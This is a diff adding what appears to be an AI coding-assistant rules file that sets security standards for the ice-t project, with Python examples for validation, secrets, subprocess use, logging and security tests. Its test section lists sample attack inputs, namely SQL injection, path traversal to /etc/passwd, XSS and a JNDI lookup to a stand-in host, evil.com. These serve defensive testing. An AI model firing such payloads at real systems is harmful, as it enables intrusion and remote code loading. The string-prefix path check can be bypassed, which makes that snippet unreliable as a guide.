@@ -1,0 +1,360 @@
+---
+description:
+globs:
+alwaysApply: false
+---
+---
+description: "Security standards, practices, and requirements for the ice-t project including secret management, input validation, and secure coding practices"
+globs: "**/*.py, **/*.yaml, **/*.yml, scripts/**/*"
+alwaysApply: false
+---
+
+# Security Standards for Ice-T
+
+## Code Security Requirements
+
+### Input Validation and Sanitization
+- Validate all external inputs (CLI arguments, file contents, API data)
+- Use type hints and validation libraries (pydantic, marshmallow)
+- Sanitize data before processing or storage
+- Implement proper error handling for invalid inputs
+
+```python
+from pydantic import BaseModel, validator
+from typing import Optional
+
+class DeploymentConfig(BaseModel):
+    """Validated deployment configuration."""
+    target_environment: str
+    version: str
+    timeout_seconds: int = 300
+
+    @validator('target_environment')
+    def validate_environment(cls, v):
+        allowed_envs = ['development', 'staging', 'production']
+        if v not in allowed_envs:
+            raise ValueError(f'Environment must be one of {allowed_envs}')
+        return v
+
+    @validator('version')
+    def validate_version(cls, v):
+        # Validate semantic version format
+        import re
+        if not re.match(r'^\d+\.\d+\.\d+$', v):
+            raise ValueError('Version must follow semantic versioning (x.y.z)')
+        return v
+```
+
+### Secure File Handling
+- Use `pathlib.Path` for safe path operations
+- Validate file paths to prevent directory traversal
+- Set appropriate file permissions
+- Clean up temporary files securely
+
+```python
+from pathlib import Path
+import os
+import tempfile
+
+def secure_file_write(content: str, filename: str, base_dir: Path) -> Path:
+    """Securely write content to file within base directory."""
+    # Resolve and validate path is within base directory
+    target_path = (base_dir / filename).resolve()
+    if not str(target_path).startswith(str(base_dir.resolve())):
+        raise ValueError("Path traversal attempt detected")
+
+    # Ensure parent directory exists
+    target_path.parent.mkdir(parents=True, exist_ok=True)
+
+    # Write with secure permissions
+    target_path.write_text(content)
+    os.chmod(target_path, 0o600)  # Owner read/write only
+
+    return target_path
+```
+
+## Secret Management
+
+### Environment Variables for Secrets
+- Never hardcode secrets in source code
+- Use environment variables for sensitive configuration
+- Implement proper secret validation and handling
+
+```python
+import os
+from typing import Optional
+
+class SecretManager:
+    """Secure secret management for ice-t."""
+
+    @staticmethod
+    def get_secret(key: str, required: bool = True) -> Optional[str]:
+        """Retrieve secret from environment variables."""
+        value = os.getenv(key)
+
+        if required and not value:
+            raise ValueError(f"Required secret '{key}' not found in environment")
+
+        return value
+
+    @staticmethod
+    def validate_secret_format(secret: str, pattern: str) -> bool:
+        """Validate secret format against expected pattern."""
+        import re
+        return bool(re.match(pattern, secret))
+
+# Usage
+api_key = SecretManager.get_secret('ICE_T_API_KEY')
+database_url = SecretManager.get_secret('DATABASE_URL', required=False)
+```
+
+### Configuration Security
+- Store sensitive configuration separately from code
+- Use configuration files with restricted permissions
+- Implement configuration validation
+
+```python
+def load_secure_config(config_path: Path) -> dict:
+    """Load configuration with security checks."""
+    # Check file permissions
+    stat = config_path.stat()
+    if stat.st_mode & 0o077:  # Check for group/other permissions
+        raise PermissionError(f"Config file {config_path} has insecure permissions")
+
+    # Load and validate configuration
+    config = yaml.safe_load(config_path.read_text())
+
+    # Remove any accidentally included secrets from logs
+    safe_config = {k: v for k, v in config.items() if 'secret' not in k.lower()}
+    logger.info(f"Loaded configuration from {config_path}", extra={"config": safe_config})
+
+    return config
+```
+
+## Script Security
+
+### Command Injection Prevention
+- Never use `shell=True` with user input
+- Use subprocess with argument lists instead of shell commands
+- Validate and sanitize command arguments
+
+```python
+import subprocess
+from typing import List
+
+def safe_command_execution(command: List[str], cwd: Optional[Path] = None) -> subprocess.CompletedProcess:
+    """Execute command safely without shell injection risk."""
+    # Validate command components
+    if not command or not isinstance(command, list):
+        raise ValueError("Command must be a non-empty list")
+
+    # Ensure executable exists and is safe
+    executable = Path(command[0])
+    if not executable.is_file():
+        raise FileNotFoundError(f"Executable not found: {executable}")
+
+    try:
+        # Execute without shell=True to prevent injection
+        result = subprocess.run(
+            command,
+            cwd=cwd,
+            capture_output=True,
+            text=True,
+            check=True,
+            timeout=300  # Prevent hanging processes
+        )
+        return result
+    except subprocess.TimeoutExpired:
+        raise RuntimeError(f"Command timed out: {' '.join(command)}")
+    except subprocess.CalledProcessError as e:
+        raise RuntimeError(f"Command failed: {e.stderr}")
+```
+
+### Safe Script Parameters
+- Validate all script parameters
+- Use allow-lists for acceptable values
+- Implement parameter sanitization
+
+```python
+from enum import Enum
+
+class AllowedEnvironment(Enum):
+    """Allowed deployment environments."""
+    DEVELOPMENT = "development"
+    STAGING = "staging"
+    PRODUCTION = "production"
+
+def validate_script_params(environment: str, version: str) -> tuple:
+    """Validate script parameters against allowed values."""
+    # Validate environment
+    try:
+        env = AllowedEnvironment(environment)
+    except ValueError:
+        raise ValueError(f"Invalid environment: {environment}")
+
+    # Validate version format
+    if not re.match(r'^\d+\.\d+\.\d+(-[a-zA-Z0-9]+)?$', version):
+        raise ValueError(f"Invalid version format: {version}")
+
+    return env.value, version
+```
+
+## Agent Security
+
+### Agent Charter Security
+- Define security constraints in agent charters
+- Implement authorization checks for agent actions
+- Log all agent security-related decisions
+
+```python
+class SecurityConstraints:
+    """Security constraints for agent operations."""
+
+    def __init__(self, charter_path: Path):
+        self.constraints = self.load_constraints(charter_path)
+
+    def is_action_authorized(self, action: str, context: dict) -> bool:
+        """Check if action is authorized by security constraints."""
+        # Check against allowed actions
+        if action not in self.constraints.get('allowed_actions', []):
+            return False
+
+        # Check environment restrictions
+        env = context.get('environment')
+        if env in self.constraints.get('restricted_environments', []):
+            return False
+
+        # Additional security checks...
+        return True
+
+    def log_security_check(self, action: str, authorized: bool, reason: str):
+        """Log security authorization decision."""
+        logger.warning(
+            "Agent security check",
+            extra={
+                "action": action,
+                "authorized": authorized,
+                "reason": reason,
+                "security_event": True
+            }
+        )
+```
+
+## Dependency Security
+
+### Secure Dependency Management
+- Pin dependency versions in requirements files
+- Regularly audit dependencies for vulnerabilities
+- Use security scanning tools in CI/CD
+
+```python
+# requirements.txt example with pinned versions
+"""
+pydantic==1.10.12
+pytest==7.4.0
+click==8.1.6
+"""
+
+# pyproject.toml security configuration
+[tool.bandit]
+targets = ["src", "scripts", "tests"]
+exclude_dirs = ["tests/fixtures"]
+skips = ["B101"]  # Skip assert_used test
+
+[tool.safety]
+ignore = []  # List of vulnerability IDs to ignore
+```
+
+### License Compliance
+- Ensure all dependencies have compatible licenses
+- Document license requirements
+- Avoid dependencies with restrictive licenses
+
+## Logging and Monitoring Security
+
+### Secure Logging Practices
+- Never log sensitive information
+- Implement log sanitization
+- Use structured logging for security events
+
+```python
+import logging
+from typing import Any, Dict
+
+class SecureLogger:
+    """Logger with automatic sensitive data sanitization."""
+
+    SENSITIVE_KEYS = {'password', 'token', 'key', 'secret', 'auth'}
+
+    def __init__(self, name: str):
+        self.logger = logging.getLogger(name)
+
+    def sanitize_data(self, data: Dict[str, Any]) -> Dict[str, Any]:
+        """Remove sensitive information from log data."""
+        sanitized = {}
+        for key, value in data.items():
+            if any(sensitive in key.lower() for sensitive in self.SENSITIVE_KEYS):
+                sanitized[key] = "***REDACTED***"
+            elif isinstance(value, dict):
+                sanitized[key] = self.sanitize_data(value)
+            else:
+                sanitized[key] = value
+        return sanitized
+
+    def info(self, message: str, extra: Dict[str, Any] = None):
+        """Log info message with sanitized extra data."""
+        if extra:
+            extra = self.sanitize_data(extra)
+        self.logger.info(message, extra=extra)
+```
+
+## Testing Security
+
+### Security Test Requirements
+- Include security tests in test suites
+- Test input validation and error handling
+- Verify access controls and authorization
+
+```python
+@pytest.mark.security
+def test_input_validation_prevents_injection():
+    """Test that input validation prevents injection attacks."""
+    malicious_inputs = [
+        "'; DROP TABLE users; --",
+        "../../../etc/passwd",
+        "<script>alert('xss')</script>",
+        "${jndi:ldap://evil.com}"
+    ]
+
+    for malicious_input in malicious_inputs:
+        with pytest.raises((ValueError, ValidationError)):
+            process_user_input(malicious_input)
+
+@pytest.mark.security
+def test_file_path_validation():
+    """Test that file path validation prevents directory traversal."""
+    base_dir = Path("/safe/directory")
+
+    # These should fail
+    dangerous_paths = [
+        "../../../etc/passwd",
+        "/etc/passwd",
+        "..\\..\\windows\\system32"
+    ]
+
+    for dangerous_path in dangerous_paths:
+        with pytest.raises(ValueError):
+            secure_file_write("content", dangerous_path, base_dir)
+```
+
+## Incident Response
+
+### Security Incident Logging
+- Implement comprehensive security event logging
+- Create alerts for suspicious activities
+- Maintain audit trails for forensic analysis
+
+### Vulnerability Response
+- Establish process for handling security vulnerabilities
+- Implement emergency patching procedures
+- Document security incidents and responses
